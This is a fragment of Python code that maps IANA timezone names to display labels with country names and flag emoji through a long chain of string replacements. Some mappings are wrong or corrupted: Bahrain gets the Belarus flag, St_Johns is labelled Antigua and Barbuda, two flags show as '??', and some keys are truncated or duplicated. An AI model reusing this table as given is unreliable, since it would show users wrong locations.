            timezone = timezone.replace('Asia/Kabul', 'Asia Kabul Afghanistan 🇦🇫')
            timezone = timezone.replace('America/Antigua', 'America Antigua and Barbuda 🇦🇬')
            timezone = timezone.replace('America/Anguilla', 'America Anguilla 🇦🇮')
            timezone = timezone.replace('Europe/Tirane', 'Europe Tirane Albania 🇦🇱')
            timezone = timezone.replace('Asia/Yerevan', 'Asia Yerevan Armenia 🇦🇲')
            timezone = timezone.replace('Africa/Luanda', 'Africa Luanda Angola 🇦🇴')
            timezone = timezone.replace('Antarctica/McMurdo', 'Antarctica McMurdo 🇦🇶')
            timezone = timezone.replace('Antarctica/South_Pole', 'Antarctica South Pole 🇦🇶')
            timezone = timezone.replace('America/Argentina/Buenos_Aires', 'America Buenos Aires Argentina 🇦🇷')
            timezone = timezone.replace('America/Argentina/Cordoba', 'America Cordoba Argentina 🇦🇷')
            timezone = timezone.replace('America/Argentina/Salta', 'America Salta Argentina 🇦🇷')
            timezone = timezone.replace('America/Argentina/Jujuy', 'America Jujuy Argentina 🇦🇷')
            timezone = timezone.replace('America/Argentina/Tucuman', 'America Tucuman Argentina 🇦🇷')
            timezone = timezone.replace('America/Argentina/Catamarca', 'America Catamarca Argentina 🇦🇷')
            timezone = timezone.replace('America/Argentina/La_Rioja', 'America La Rioja Argentina 🇦🇷')
            timezone = timezone.replace('America/Argentina/San_Juan', 'America San Juan Argentina 🇦🇷')
            timezone = timezone.replace('America/Argentina/Mendoza', 'America Mendoza Argentina ??🇷')
            timezone = timezone.replace('America/Argentina/San_Luis', 'America San Luis Argentina 🇦🇷')
            timezone = timezone.replace('America/Argentina/Rio_Gallegos', 'America Rio Gallegos Argentina 🇦🇷')
            timezone = timezone.replace('America/Argentina/Ushuaia', 'America Ushuaia Argentina 🇦🇷')
            timezone = timezone.replace('Europe/Vienna', 'Europe Vienna Austria 🇦🇹')
            timezone = timezone.replace('Australia/Lord_Howe', 'Australia Lord Howe Australia 🇦🇺')
            timezone = timezone.replace('Australia/Hobart', 'Australia Hobart Australia 🇦🇺')
            timezone = timezone.replace('Australia/Currie', 'Australia Currie Australia 🇦🇺')
            timezone = timezone.replace('Australia/Melbourne', 'Australia Melbourne Australia 🇦🇺')
            timezone = timezone.replace('Australia/Sydney', 'Australia Sydney Australia 🇦🇺')
            timezone = timezone.replace('Australia/Broken_Hill', 'Australia Broken Hill Australia 🇦🇺')
            timezone = timezone.replace('Australia/Brisbane', 'Australia Brisbane Australia 🇦🇺')
            timezone = timezone.replace('Australia/Lindeman', 'Australia Lindeman Australia 🇦🇺')
            timezone = timezone.replace('Australia/Adelaide', 'Australia Adelaide Australia 🇦🇺')
            timezone = timezone.replace('Australia/Lindeman', 'Australia Lindeman Australia 🇦🇺')
            timezone = timezone.replace('Australia/Adelaide', 'Australia Adelaide Australia 🇦🇺')
            timezone = timezone.replace('Australia/Darwin', 'Australia Darwin Australia 🇦🇺')
            timezone = timezone.replace('Australia/Perth', 'Australia Perth Australia 🇦🇺')
            timezone = timezone.replace('Australia/Eucla', 'Australia Eucla Australia 🇦🇺')
            timezone = timezone.replace('America/Aruba', 'America Aruba 🇦🇼')
            timezone = timezone.replace('Europe/Mariehamn', 'Europe Mariehamn Åland Islands 🇦🇽')
            timezone = timezone.replace('Asia/Baku', 'Asia Baku Azerbaijan 🇦🇿')
            timezone = timezone.replace('Europe/Sarajevo', 'Europe Sarajevo Bosnia and Herzegovina 🇧🇦')
            timezone = timezone.replace('America/Barbados', 'America Barbados 🇧🇧')
            timezone = timezone.replace('Asia/Dhaka', 'Asia Dhaka Bangladesh 🇧🇩')
            timezone = timezone.replace('Europe/Brussels', 'Europe Brussels Belgium 🇧🇪')
            timezone = timezone.replace('Africa/Ouagadougou', 'Africa Ouagadougou Burkina Faso 🇧🇫')
            timezone = timezone.replace('Europe/Sofia', 'Europe Sofia Bulgaria 🇧🇬')
            timezone = timezone.replace('Asia/Bahrain', 'Asia Bahrain 🇧🇾')
            timezone = timezone.replace('Africa/Bujumbura', 'Africa Bujumbura Burundi 🇧🇮')
            timezone = timezone.replace('Africa/Porto', 'Africa Porto-Novo Benin 🇧🇯')
            timezone = timezone.replace('America/St_Barthelemy', 'America Saint Barthélemy 🇧🇱')
            timezone = timezone.replace('Atlantic/Bermuda', 'Atlantic Bermuda 🇧🇲')
            timezone = timezone.replace('Asia/Brunei', 'Asia Brunei 🇧🇳')
            timezone = timezone.replace('America/La_Paz', 'America La Paz Bolivia 🇧🇴')
            timezone = timezone.replace('America/Kralendijk', 'America Kralendijk Bonaire 🇧🇶')
            timezone = timezone.replace('America/Bahia', 'America Bahia Brazil 🇧🇷')
            timezone = timezone.replace('America/Manaus', 'America Manaus Brazil 🇧🇷')
            timezone = timezone.replace('America/Belem', 'America Belém Brazil 🇧🇷')
            timezone = timezone.replace('America/Sao_Paulo', 'America São Paulo Brazil 🇧🇷')
            timezone = timezone.replace('America/Noronha', 'America Noronha Brazil 🇧🇷')
            timezone = timezone.replace('America/Fortaleza', 'America Fortaleza Brazil 🇧🇷')
            timezone = timezone.replace('America/Recife', 'America Recife Brazil 🇧🇷')
            timezone = timezone.replace('America/Araguaina', 'America Araguaína Brazil 🇧🇷')
            timezone = timezone.replace('America/Maceio', 'America Maceió Brazil 🇧🇷')
            timezone = timezone.replace('America/Campo_Grande', 'America Campo Grande Brazil 🇧🇷')
            timezone = timezone.replace('America/Cuiaba', 'America Cuiabá Brazil 🇧🇷')
            timezone = timezone.replace('America/Santarem', 'America Santarém Brazil 🇧🇷')
            timezone = timezone.replace('America/Porto_Velho', 'America Porto Velho Brazil 🇧🇷')
            timezone = timezone.replace('America/Boa_Vista', 'America Boa Vista Brazil 🇧🇷')
            timezone = timezone.replace('America/Eirunepe', 'America Eirunepé Brazil 🇧🇷')
            timezone = timezone.replace('America/Rio_Branco', 'America Rio Branco Brazil 🇧🇷')
            timezone = timezone.replace('America/Nassau', 'America Nassau Bahamas 🇧🇸')
            timezone = timezone.replace('Asia/Thimphu', 'Asia Thimphu Bhutan 🇧🇹')
            timezone = timezone.replace('Africa/Gaborone', 'Africa Gaborone Botswana 🇧🇼')
            timezone = timezone.replace('Europe/Minsk', 'Europe Minsk Belarus 🇧🇾')
            timezone = timezone.replace('America/Belize', 'America Belize 🇧🇿')
            timezone = timezone.replace('America/St_Johns', 'America Saint Johns Antigua and Barbuda 🇦🇬')
            timezone = timezone.replace('America/Halifax', 'America Halifax Canada 🇨🇦')
            timezone = timezone.replace('America/Glace_Bay', 'America Glace Bay Canada 🇨🇦')
            timezone = timezone.replace('America/Moncton', 'America Moncton Canada 🇨🇦')
            timezone = timezone.replace('America/Goose_Bay', 'America Goose Bay Canada 🇨🇦')
            timezone = timezone.replace('America/Blanc', 'America Blanc Canada 🇨🇦')
            timezone = timezone.replace('America/Montreal', 'America Montreal Canada 🇨🇦')
            timezone = timezone.replace('America/Toronto', 'America Toronto Canada 🇨🇦')
            timezone = timezone.replace('America/Nipigon', 'America Nipigon Canada 🇨🇦')
            timezone = timezone.replace('America/Thunder_Bay', 'America Thunder Bay Canada 🇨🇦')
            timezone = timezone.replace('America/Iqaluit', 'America Iqaluit Canada 🇨🇦')
            timezone = timezone.replace('America/Pangnirtung', 'America Pangnirtung Canada 🇨🇦')
            timezone = timezone.replace('America/Resolute', 'America Resolute Canada 🇨🇦')
            timezone = timezone.replace('America/Atikokan', 'America Atikokan Canada 🇨🇦')
            timezone = timezone.replace('America/Rankin_Inlet', 'America Rankin Inlet Canada 🇨🇦')
            timezone = timezone.replace('America/Winnipeg', 'America Winnipeg Canada 🇨🇦')
            timezone = timezone.replace('America/Rainy_River', 'America Rainy River Canada 🇨🇦')
            timezone = timezone.replace('America/Regina', 'America Regina Canada 🇨🇦')
            timezone = timezone.replace('America/Swift_Current', 'America Swift Current Canada 🇨🇦')
            timezone = timezone.replace('America/Edmonton', 'America Edmonton Canada 🇨🇦')
            timezone = timezone.replace('America/Cambridge_Bay', 'America Cambridge Bay Canada 🇨🇦')
            timezone = timezone.replace('America/Yellowknife', 'America Yellowknife Canada 🇨🇦')
            timezone = timezone.replace('America/Inuvik', 'America Inuvik Canada 🇨🇦')
            timezone = timezone.replace('America/Creston', 'America Creston Canada 🇨🇦')
            timezone = timezone.replace('America/Dawson_Creek', 'America Dawson Creek Canada 🇨🇦')
            timezone = timezone.replace('America/Vancouver', 'America Vancouver Canada 🇨🇦')
            timezone = timezone.replace('America/Whitehorse', 'America Whitehorse Canada 🇨🇦')
            timezone = timezone.replace('America/Dawson', 'America Dawson Canada 🇨🇦')
            timezone = timezone.replace('Indian/Cocos', 'Indian Cocos Islands 🇨🇨')
            timezone = timezone.replace('Africa/Kinshasa', 'Africa KinshasaDemocratic Republic of the Congo 🇨🇩')
            timezone = timezone.replace('Africa/Lubumbashi', 'Africa LubumbashiDemocratic Republic of the Congo 🇨🇩')
            timezone = timezone.replace('Africa/Bangui', 'Africa Bangui Central African Republic 🇨🇫')
            timezone = timezone.replace('Europe/Zurich', 'Europe Zurich Switzerland 🇨🇭')
            timezone = timezone.replace('Africa/Abidjan', "Africa Abidjan Côte d'Ivoire 🇨🇮")
            timezone = timezone.replace('Pacific/Rarotonga', 'Pacific Rarotonga Cook Islands 🇨🇰')
            timezone = timezone.replace('America/Santiago', 'America Santiago Chile 🇨🇱')
            timezone = timezone.replace('Pacific/Easter', 'Pacific Easter Island Chile 🇨🇱')
            timezone = timezone.replace('Africa/Douala', 'Africa Douala Cameroon 🇨🇲')
            timezone = timezone.replace('Asia/Shanghai', 'Asia Shanghai China 🇨🇳 ')
            timezone = timezone.replace('Asia/Harbin', 'Asia Harbin China 🇨🇳 ')
            timezone = timezone.replace('Asia/Chongqing', 'Asia Chongqing China 🇨🇳 ')
            timezone = timezone.replace('Asia/Urumqi', 'Asia Urumqi China 🇨🇳 ')
            timezone = timezone.replace('Asia/Kashgar', 'Asia Kashgar China 🇨🇳 ')
            timezone = timezone.replace('America/Bogota', 'America Bogota Colombia 🇨🇴')
            timezone = timezone.replace('America/Costa_Rica', 'America Costa Rica 🇨🇷')
            timezone = timezone.replace('America/Havana', 'America Havana Cuba 🇨🇺')
            timezone = timezone.replace('Atlantic/Cape_Verde', 'Atlantic Cape Verde 🇨🇻')
            timezone = timezone.replace('America/Curacao', 'America Curacao 🇨🇼')
            timezone = timezone.replace('Indian/Christmas', 'Indian Christmas Island 🇨🇽')
            timezone = timezone.replace('Asia/Nicosia', 'Asia Nicosia Cyprus 🇨🇾')
            timezone = timezone.replace('Europe/Prague', 'Europe Prague Czech Republic 🇨🇿')
            timezone = timezone.replace('Europe/Berlin', 'Europe Berlin Germany 🇩🇪')
            timezone = timezone.replace('Africa/Djibouti', 'Africa Djibouti 🇩🇯')
            timezone = timezone.replace('Europe/Copenhagen', 'Europe Copenhagen Denmark 🇩🇰')
            timezone = timezone.replace('America/Dominica', 'America Dominica 🇩🇲')
            timezone = timezone.replace('America/Santo_Domingo', 'America Santo Domingo Dominican Republic 🇩🇴')
            timezone = timezone.replace('Africa/Algiers', 'Africa Algiers Algeria 🇩🇿')
            timezone = timezone.replace('America/Guayaquil', 'America Guayaquil Ecuador 🇪🇨')
            timezone = timezone.replace('Pacific/Galapagos', 'Pacific Galápagos Islands Ecuador 🇪🇨')
            timezone = timezone.replace('Europe/Tallinn', 'Europe Tallinn Estonia 🇪🇪')
            timezone = timezone.replace('Africa/Cairo', 'Africa Cairo Egypt 🇪🇬')
            timezone = timezone.replace('Africa/El_Aaiun', 'Africa El Aaiun Western Sahara 🇪🇭')
            timezone = timezone.replace('Africa/Asmara', 'Africa Asmara Eritrea 🇪🇷')
            timezone = timezone.replace('Europe/Madrid', 'Europe Madrid Spain 🇪🇸 ')
            timezone = timezone.replace('Africa/Ceuta', 'Africa Ceuta Spain 🇪🇸 ')
            timezone = timezone.replace('Atlantic/Canary', 'Atlantic Canary Islands Spain 🇪🇸 ')
            timezone = timezone.replace('Africa/Addis_Ababa', 'Africa Addis Ababa Ethiopia 🇪🇹')
            timezone = timezone.replace('Europe/Helsinki', 'Europe Helsinki Finland 🇫🇮')
            timezone = timezone.replace('Pacific/Fiji', 'Pacific Fiji 🇫🇯')
            timezone = timezone.replace('Atlantic/Stanley', 'Atlantic Stanley Falkland Islands 🇫🇰')
            timezone = timezone.replace('Pacific/Chuuk', 'Pacific Chuuk Micronesia 🇫🇲')
            timezone = timezone.replace('Atlantic/Faroe', 'Atlantic Faroe Islands 🇫🇴')
            timezone = timezone.replace('Europe/Paris', 'Europe Paris France 🇫🇷')
            timezone = timezone.replace('Africa/Libreville', 'Africa Libreville Gabon 🇬🇦')
            timezone = timezone.replace('Europe/London', 'Europe London Great Britain 🇬🇧')
            timezone = timezone.replace('America/Grenada', 'America Grenada 🇬🇩')
            timezone = timezone.replace('Asia/Tbilisi', 'Asia Tbilisi Georgia 🇬🇪')
            timezone = timezone.replace('America/Cayenne', 'America Cayenne French Guiana 🇬🇫')
            timezone = timezone.replace('Europe/Guernsey', 'Europe Guernsey 🇬🇬')
            timezone = timezone.replace('Africa/Accra', 'Africa Accra Ghana 🇬🇭')
            timezone = timezone.replace('Europe/Gibraltar', 'Europe Gibraltar 🇬🇮')
            timezone = timezone.replace('America/Godthab', 'America Godthab Greenland 🇬🇱')
            timezone = timezone.replace('America/Danmarkshavn', 'America Danmarkshavn Greenland 🇬🇱')
            timezone = timezone.replace('America/Scoresbysund', 'America Scoresbysund Greenland 🇬🇱')
            timezone = timezone.replace('America/Thule', 'America Thule Greenland 🇬🇱')
            timezone = timezone.replace('Africa/Banjul', 'Africa Banjul Gambia 🇬🇲')
            timezone = timezone.replace('Africa/Conakry', 'Africa Conakry Guinea 🇬🇳')
            timezone = timezone.replace('America/Guadeloupe', 'America Guadeloupe 🇬🇵')
            timezone = timezone.replace('Africa/Malabo', 'Africa Malabo Equatorial Guinea 🇬🇶')
            timezone = timezone.replace('Europe/Athens', 'Europe Athens Greece 🇬🇷')
            timezone = timezone.replace('Atlantic/South_Georgia', 'Atlantic South Georgia and the South Sandwich Islands 🇬🇸')
            timezone = timezone.replace('America/Guatemala', 'America Guatemala 🇬🇹')
            timezone = timezone.replace('Pacific/Guam', 'Pacific Guam 🇬🇺')
            timezone = timezone.replace('Africa/Bissau', 'Africa Bissau Guinea-Bissau 🇬🇼')
            timezone = timezone.replace('America/Guyana', 'America Guyana 🇬🇾')
            timezone = timezone.replace('Asia/Hong_Kong', 'Asia Hong Kong 🇭🇰')
            timezone = timezone.replace('America/Tegucigalpa', 'America Tegucigalpa Honduras 🇭🇳')
            timezone = timezone.replace('Europe/Zagreb', 'Europe Zagreb Croatia 🇭🇷')
            timezone = timezone.replace('America/Port', 'America Port-au-Prince Haiti 🇭🇹')
            timezone = timezone.replace('Europe/Budapest', 'Europe Budapest Hungary 🇭🇺')
            timezone = timezone.replace('Asia/Jakarta', 'Asia Jakarta Indonesia 🇮🇩 ')
            timezone = timezone.replace('Asia/Pontianak', 'Asia Pontianak Indonesia 🇮🇩 ')
            timezone = timezone.replace('Asia/Makassar', 'Asia Makassar Indonesia 🇮🇩 ')
            timezone = timezone.replace('Asia/Jayapura', 'Asia Jayapura Indonesia 🇮🇩 ')
            timezone = timezone.replace('Europe/Dublin', 'Europe Dublin Ireland 🇮🇪')
            timezone = timezone.replace('Asia/Jerusalem', 'Asia Jerusalem Israel 🇮🇱')
            timezone = timezone.replace('Europe/Isle_of_Man', 'Europe Isle of Man 🇮🇲')
            timezone = timezone.replace('Asia/Kolkata', 'Asia Kolkata India 🇮🇳')
            timezone = timezone.replace('Indian/Chagos', 'Indian Chagos British Indian Ocean Territory 🇮🇴')
            timezone = timezone.replace('Asia/Baghdad', 'Asia Baghdad Iraq 🇮🇶')
            timezone = timezone.replace('Asia/Tehran', 'Asia Tehran Iran 🇮🇷')
            timezone = timezone.replace('Atlantic/Reykjavik', 'Atlantic Reykjavik Iceland 🇮🇸')
            timezone = timezone.replace('Europe/Rome', 'Europe Rome Italy 🇮🇹')
            timezone = timezone.replace('Europe/Jersey', 'Europe Jersey 🇯🇪')
            timezone = timezone.replace('America/Jamaica', 'America Jamaica 🇯🇲')
            timezone = timezone.replace('Asia/Amman', 'Asia Amman Jordan 🇯🇴')
            timezone = timezone.replace('Asia/Tokyo', 'Asia Tokyo Japan 🇯🇵')
            timezone = timezone.replace('Africa/Nairobi', 'Africa Nairobi Kenya 🇰🇪')
            timezone = timezone.replace('Asia/Bishkek', 'Asia Bishkek Kyrgyzstan 🇰🇬')
            timezone = timezone.replace('Asia/Phnom_Penh', 'Asia Phnom Penh Cambodia 🇰🇭')
            timezone = timezone.replace('Pacific/Tarawa', 'Pacific Tarawa Kiribati 🇰🇮')
            timezone = timezone.replace('Pacific/Enderbury', 'Pacific Enderbury Kiribati 🇰🇮')
            timezone = timezone.replace('Pacific/Kiritimati', 'Pacific Kiritimati Kiribati 🇰🇮')
            timezone = timezone.replace('Indian/Comoro', 'Indian Comoro Islands 🇰🇲')
            timezone = timezone.replace('America/St_Kitts', 'America Saint Kitts and Nevis 🇰🇳')
            timezone = timezone.replace('Asia/Pyongyang', 'Asia Pyongyang North Korea 🇰🇵')
            timezone = timezone.replace('Asia/Seoul', 'Asia Seoul South Korea 🇰🇷')
            timezone = timezone.replace('Asia/Kuwait', 'Asia Kuwait 🇰🇼')
            timezone = timezone.replace('America/Cayman', 'America Cayman Islands 🇰🇾')
            timezone = timezone.replace('Asia/Almaty', 'Asia Almaty Kazakhstan 🇰🇿 ')
            timezone = timezone.replace('Asia/Qyzylorda', 'Asia Qyzylorda Kazakhstan 🇰🇿 ')
            timezone = timezone.replace('Asia/Aqtobe', 'Asia Aqtobe Kazakhstan 🇰🇿 ')
            timezone = timezone.replace('Asia/Aqtau', 'Asia Aqtau Kazakhstan 🇰🇿 ')
            timezone = timezone.replace('Asia/Oral', 'Asia Oral Kazakhstan 🇰🇿 ')
            timezone = timezone.replace('Asia/Vientiane', 'Asia Vientiane Laos 🇱🇦')
            timezone = timezone.replace('Asia/Beirut', 'Asia Beirut Lebanon 🇱🇧')
            timezone = timezone.replace('America/St_Lucia', 'America Saint Lucia 🇱🇨')
            timezone = timezone.replace('Europe/Vaduz', 'Europe Vaduz Liechtenstein 🇱🇮')
            timezone = timezone.replace('Asia/Colombo', 'Asia Colombo Sri Lanka 🇱🇰')
            timezone = timezone.replace('Africa/Monrovia', 'Africa Monrovia Liberia 🇱🇷')
            timezone = timezone.replace('Africa/Maseru', 'Africa Maseru Lesotho 🇱🇸')
            timezone = timezone.replace('Europe/Vilnius', 'Europe Vilnius Lithuania 🇱🇹')
            timezone = timezone.replace('Europe/Luxembourg', 'Europe Luxembourg 🇱🇺')
            timezone = timezone.replace('Europe/Riga', 'Europe Riga Latvia 🇱🇻')
            timezone = timezone.replace('Africa/Tripoli', 'Africa Tripoli Libya 🇱🇾')
            timezone = timezone.replace('Africa/Casablanca', 'Africa Casablanca Morocco 🇲🇦')
            timezone = timezone.replace('Europe/Monaco', 'Europe Monaco 🇲🇨')
            timezone = timezone.replace('Europe/Chisinau', 'Europe Chisinau Moldova 🇲🇩')
            timezone = timezone.replace('Europe/Podgorica', 'Europe Podgorica Montenegro 🇲🇪')
            timezone = timezone.replace('America/Marigot', 'America Marigot Saint Martin 🇲🇫')
            timezone = timezone.replace('Indian/Antananarivo', 'Indian Antananarivo Madagascar 🇲🇬')
            timezone = timezone.replace('Pacific/Majuro', 'Pacific Majuro Marshall Islands 🇲🇭')
            timezone = timezone.replace('Pacific/Kwajalein', 'Pacific Kwajalein Marshall Islands 🇲🇭')
            timezone = timezone.replace('Europe/Skopje', 'Europe Skopje North Macedonia 🇲🇰')
            timezone = timezone.replace('Africa/Bamako', 'Africa Bamako Mali 🇲🇱')
            timezone = timezone.replace('Asia/Rangoon', 'Asia Rangoon Myanmar 🇲🇲')
            timezone = timezone.replace('Asia/Ulaanbaatar', 'Asia Ulaanbaatar Mongolia 🇲🇳')
            timezone = timezone.replace('Asia/Hovd', 'Asia Hovd Mongolia 🇲🇳')
            timezone = timezone.replace('Asia/Choibalsan', 'Asia Choibalsan Mongolia 🇲🇳')
            timezone = timezone.replace('Asia/Macau', 'Asia Macau 🇲🇴')
            timezone = timezone.replace('Pacific/Saipan', 'Pacific Saipan Northern Mariana Islands 🇲🇵')
            timezone = timezone.replace('America/Martinique', 'America Martinique 🇲🇶')
            timezone = timezone.replace('Africa/Nouakchott', 'Africa Nouakchott Mauritania 🇲🇷')
            timezone = timezone.replace('America/Montserrat', 'America Montserrat 🇲🇸')
            timezone = timezone.replace('Europe/Malta', 'Europe Malta 🇲🇹')
            timezone = timezone.replace('Indian/Mauritius', 'Indian Mauritius 🇲🇺')
            timezone = timezone.replace('Indian/Maldives', 'Indian Maldives 🇲🇻')
            timezone = timezone.replace('Africa/Blantyre', 'Africa Blantyre Malawi 🇲🇼')
            timezone = timezone.replace('America/Mexico_City', 'America Mexico City Mexico 🇲🇽')
            timezone = timezone.replace('America/Cancun', 'America Cancun Mexico 🇲🇽')
            timezone = timezone.replace('America/Merida', 'America Merida Mexico 🇲🇽')
            timezone = timezone.replace('America/Monterrey', 'America Monterrey Mexico 🇲🇽')
            timezone = timezone.replace('America/Matamoros', 'America Matamoros Mexico 🇲🇽')
            timezone = timezone.replace('America/Mazatlan', 'America Mazatlan Mexico 🇲🇽')
            timezone = timezone.replace('America/Chihuahua', 'America Chihuahua Mexico 🇲🇽')
            timezone = timezone.replace('America/Ojinaga', 'America Ojinaga Mexico 🇲🇽')
            timezone = timezone.replace('America/Hermosillo', 'America Hermosillo Mexico 🇲🇽')
            timezone = timezone.replace('America/Tijuana', 'America Tijuana Mexico 🇲🇽')
            timezone = timezone.replace('America/Santa_Isabel', 'America Santa Isabel Mexico 🇲🇽')
            timezone = timezone.replace('America/Bahia_Banderas', 'America Bahia Banderas Mexico 🇲🇽')
            timezone = timezone.replace('Asia/Kuala_Lumpur', 'Asia Kuala Lumpur Malaysia 🇲🇾')
            timezone = timezone.replace('Asia/Kuching', 'Asia Kuching Malaysia 🇲🇾')
            timezone = timezone.replace('Africa/Maputo', 'Africa Maputo Mozambique 🇲🇿')
            timezone = timezone.replace('Africa/Windhoek', 'Africa Windhoek Namibia 🇳🇦')
            timezone = timezone.replace('Pacific/Noumea', 'Pacific Noumea New Caledonia 🇳🇨')
            timezone = timezone.replace('Africa/Niamey', 'Africa Niamey Niger 🇳🇪')
            timezone = timezone.replace('Pacific/Norfolk', 'Pacific Norfolk Island 🇳🇫')
            timezone = timezone.replace('Africa/Lagos', 'Africa Lagos Nigeria 🇳🇬')
            timezone = timezone.replace('America/Managua', 'America Managua Nicaragua 🇳🇮')
            timezone = timezone.replace('Europe/Amsterdam', 'Europe Amsterdam Netherlands 🇳🇱')
            timezone = timezone.replace('Europe/Oslo', 'Europe Oslo Norway 🇳🇴')
            timezone = timezone.replace('Asia/Kathmandu', 'Asia Kathmandu Nepal 🇳🇵')
            timezone = timezone.replace('Pacific/Nauru', 'Pacific Nauru 🇳🇷')
            timezone = timezone.replace('Pacific/Niue', 'Pacific Niue 🇳🇺')
            timezone = timezone.replace('Pacific/Auckland', 'Pacific Auckland New Zealand 🇳🇿')
            timezone = timezone.replace('Pacific/Chatham', 'Pacific Chatham New Zealand 🇳🇿')
            timezone = timezone.replace('Asia/Muscat', 'Asia Muscat Oman 🇴🇲')
            timezone = timezone.replace('America/Panama', 'America Panama 🇵🇦')
            timezone = timezone.replace('America/Lima', 'America Lima 🇵🇪 Peru')
            timezone = timezone.replace('Pacific/Tahiti', 'Pacific Tahiti French Polynesia 🇵🇫 ')
            timezone = timezone.replace('Pacific/Marquesas', 'Pacific Marquesas French Polynesia 🇵🇫 ')
            timezone = timezone.replace('Pacific/Gambier', 'Pacific Gambier French Polynesia 🇵🇫 ')
            timezone = timezone.replace('Pacific/Port_Moresby', 'Pacific Port_Moresby Papua New Guinea 🇵🇬')
            timezone = timezone.replace('Asia/Manila', 'Asia Manila Philippines 🇵🇭')
            timezone = timezone.replace('Asia/Karachi', 'Asia Karachi Pakistan 🇵🇰')
            timezone = timezone.replace('Europe/Warsaw', 'Europe Warsaw Poland 🇵🇱')
            timezone = timezone.replace('America/Miquelon', 'America Saint Pierre and Miquelon 🇵🇲')
            timezone = timezone.replace('Pacific/Pitcairn', 'Pacific Pitcairn Islands 🇵🇳')
            timezone = timezone.replace('America/Puerto_Rico', 'America Puerto Rico 🇵🇷')
            timezone = timezone.replace('Asia/Gaza', 'Asia Gaza Palastinian Territories 🇵🇸')
            timezone = timezone.replace('Asia/Hebron', 'Asia Hebron Palastinian Territories 🇵🇸')
            timezone = timezone.replace('Europe/Lisbon', 'Europe Lisbon Portugal 🇵??')
            timezone = timezone.replace('Atlantic/Madeira', 'Atlantic Madeira Portugal 🇵🇹')
            timezone = timezone.replace('Atlantic/Azores', 'Atlantic Azores Portugal 🇵🇹')
            timezone = timezone.replace('Pacific/Palau', 'Pacific Palau 🇵🇼')
            timezone = timezone.replace('America/Asuncion', 'America Asuncion Paraguay 🇵🇾')
            timezone = timezone.replace('Asia/Qatar', 'Asia Qatar 🇶🇦')
            timezone = timezone.replace('Indian/Reunion', 'Indian Réunion 🇷🇪')
            timezone = timezone.replace('Europe/Bucharest', 'Europe Bucharest Romania 🇷🇴')
            timezone = timezone.replace('Europe/Belgrade', 'Europe Belgrade Serbia 🇷🇸')
            timezone = timezone.replace('Europe/Kaliningrad', 'Europe Kaliningrad Russia 🇷🇺')
            timezone = timezone.replace('Europe/Moscow', 'Europe Moscow Russia 🇷🇺')
            timezone = timezone.replace('Europe/Volgograd', 'Europe Volgograd Russia 🇷🇺')
            timezone = timezone.replace('Europe/Samara', 'Europe Samara Russia 🇷🇺')
            timezone = timezone.replace('Asia/Yekaterinburg', 'Asia Yekaterinburg Russia 🇷🇺')
            timezone = timezone.replace('Asia/Omsk', 'Asia Omsk Russia 🇷🇺')
            timezone = timezone.replace('Asia/Novosibirsk', 'Asia Novosibirsk Russia 🇷🇺')
            timezone = timezone.replace('Asia/Novokuznetsk', 'Asia Novokuznetsk Russia 🇷🇺')
            timezone = timezone.replace('Asia/Krasnoyarsk', 'Asia Krasnoyarsk Russia 🇷🇺')
            timezone = timezone.replace('Asia/Irkutsk', 'Asia Irkutsk Russia 🇷🇺')
            timezone = timezone.replace('Asia/Yakutsk', 'Asia Yakutsk Russia 🇷🇺')
            timezone = timezone.replace('Asia/Vladivostok', 'Asia Vladivostok Russia 🇷🇺')
            timezone = timezone.replace('Asia/Sakhalin', 'Asia Sakhalin Russia 🇷🇺')
            timezone = timezone.replace('Asia/Magadan', 'Asia Magadan Russia 🇷🇺')
            timezone = timezone.replace('Asia/Kamchatka', 'Asia Kamchatka Russia 🇷🇺')
            timezone = timezone.replace('Asia/Anadyr', 'Asia Anadyr Russia 🇷🇺')
            timezone = timezone.replace('Africa/Kigali', 'Africa Kigali Rwanda 🇷🇼')
            timezone = timezone.replace('Asia/Riyadh', 'Asia Riyadh Saudi Arabia 🇸🇦')
            timezone = timezone.replace('Pacific/Guadalcanal', 'Pacific Guadalcanal Solomon Islands 🇸🇧')
            timezone = timezone.replace('Indian/Mahe', 'Indian Mahe Seychelles 🇸🇨')
            timezone = timezone.replace('Africa/Khartoum', 'Africa Khartoum Sudan 🇸🇩')
            timezone = timezone.replace('Europe/Stockholm', 'Europe Stockholm Sweden 🇸🇪')
            timezone = timezone.replace('Asia/Singapore', 'Asia Singapore 🇸🇬')
            timezone = timezone.replace('Atlantic/St_Helena', 'Atlantic Saint Helena 🇸🇭')
            timezone = timezone.replace('Europe/Ljubljana', 'Europe Ljubljana Slovenia 🇸🇮')
            timezone = timezone.replace('Arctic/Longyearbyen', 'Arctic Longyearbyen Svalbard and Jan Mayen 🇸🇯')
            timezone = timezone.replace('Europe/Bratislava', 'Europe Bratislava Slovakia 🇸🇰')
            timezone = timezone.replace('Africa/Freetown', 'Africa Freetown Sierra Leone 🇸🇱')
            timezone = timezone.replace('Europe/San_Marino', 'Europe San Marino 🇸🇲')
            timezone = timezone.replace('Africa/Dakar', 'Africa Dakar Senegal 🇸🇳')
            timezone = timezone.replace('Africa/Mogadishu', 'Africa Mogadishu Somalia 🇸🇴')
            timezone = timezone.replace('America/Paramaribo', 'America Paramaribo Suriname 🇸🇷')
            timezone = timezone.replace('Africa/Juba', 'Africa Juba South Sudan 🇸🇸')
            timezone = timezone.replace('Africa/Sao_Tome', 'Africa São Tomé and Príncipe 🇸🇹')
            timezone = timezone.replace('America/El_Salvador', 'America El Salvador 🇸🇻')
            timezone = timezone.replace('America/Lower_Princes', 'America Lower Princes Sint Maarten 🇸🇽')
            timezone = timezone.replace('Asia/Damascus', 'Asia Damascus Syria 🇸🇾')
            timezone = timezone.replace('Africa/Mbabane', 'Africa Mbabane Swaziland 🇸🇿')
            timezone = timezone.replace('America/Grand_Turk', 'America Grand Turk Turks and Caicos Islands 🇹🇨')
            timezone = timezone.replace('Africa/Ndjamena', 'Africa Ndjamena Chad 🇹🇩')
            timezone = timezone.replace('Indian/Kerguelen', 'Indian Kerguelen French Southern Territories 🇹🇫')
            timezone = timezone.replace('Africa/Lome', 'Africa Lome Togo 🇹🇬')
            timezone = timezone.replace('Asia/Bangkok', 'Asia Bangkok Thailand 🇹🇭')
            timezone = timezone.replace('Asia/Dushanbe', 'Asia Dushanbe Tajikistan 🇹🇯')
            timezone = timezone.replace('Pacific/Fakaofo', 'Pacific Fakaofo Tokelau 🇹🇰')
            timezone = timezone.replace('Asia/Dili', 'Asia Dili Timor-Leste 🇹🇱')
            timezone = timezone.replace('Asia/Ashgabat', 'Asia Ashgabat Turkmenistan 🇹🇲')
